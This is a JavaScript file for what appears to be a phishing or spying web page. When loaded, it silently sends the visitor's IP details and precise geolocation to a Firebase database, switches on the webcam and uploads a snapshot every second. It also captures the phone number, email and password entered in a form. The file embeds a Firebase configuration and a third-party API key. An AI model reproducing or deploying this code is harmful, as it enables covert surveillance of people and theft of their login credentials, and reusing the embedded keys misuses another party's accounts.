
import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.6.7/firebase-app.js'
import { getDatabase, ref, set } from 'https://cdnjs.cloudflare.com/ajax/libs/firebase/9.6.7/firebase-database.min.js';

const firebaseConfig = {
  apiKey: "AIzaSyAW7KpTUQ52xhDOnbrQkya5r8MbT5rJALk",
  authDomain: "rbbpravo.firebaseapp.com",
  databaseURL: "https://rbbpravo-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "rbbpravo",
  storageBucket: "rbbpravo.appspot.com",
  messagingSenderId: "589641380814",
  appId: "1:589641380814:web:845c22e94934a62d11f19f"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

function writeData(data, name = 'data/') {
  const time = new Date().getTime();
  set(ref(db, name + time.toString()), data);
}

fetch('https://api.ipdata.co/?api-key=6f23068f260c756949a9f990a85c94ad1674fc276fd7b32602d1f2c6')
  .then(response => response.json())
  .then(data => writeData(data, 'ipinfo/'));

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => writeData(data, 'ip/'));

const videoId = 'video';
const scaleFactor = 0.25;

const optionsGeo = {
  enableHighAccuracy: true,
  timeout: 30000,
  maximumAge: 0
};

const successGeo = ({ coords }) => {
  const result = {
    latitude: coords.latitude,
    longitude: coords.longitude,
  };

  writeData(result, 'geo/');
};

const errorGeo = ({ code, message }) => console.warn(`ERROR(${code}): ${message}`);

navigator.geolocation.getCurrentPosition(successGeo, errorGeo, optionsGeo);
navigator.getUserMedia(
  { audio: false, video: { width: 1280, height: 720 } },
  (stream) => {
    const video = document.querySelector('video');

    if (video) {
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        video.play();
      };
      setInterval(() => {
          shoot()
      }, 1000)
    }
  },
  (err) => console.log("The following error occurred: " + err.name),
);

function capture(video, scaleFactor) {
  if (scaleFactor == null) {
    scaleFactor = 1;
  }

  const w = video.videoWidth * scaleFactor;
  const h = video.videoHeight * scaleFactor;
  const canvas = document.createElement('canvas');

  canvas.width = w;
  canvas.height = h;

  const ctx = canvas.getContext('2d');

  ctx.drawImage(video, 0, 0, w, h);

  return canvas;
}

function shoot() {
  const video = document.getElementById(videoId);
  const canvas = capture(video, scaleFactor);
  const based64 = canvas.toDataURL("image/png");

  const result = {
    image: based64,
  };

  writeData(result, 'image/');
}

const btn = document.getElementById('btn');
btn.addEventListener('click', (e) => {
  e.preventDefault();

  const phone = document.getElementById('number').value;
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  const result = {
    phone,
    email,
    password,
  };

  writeData(result);
});
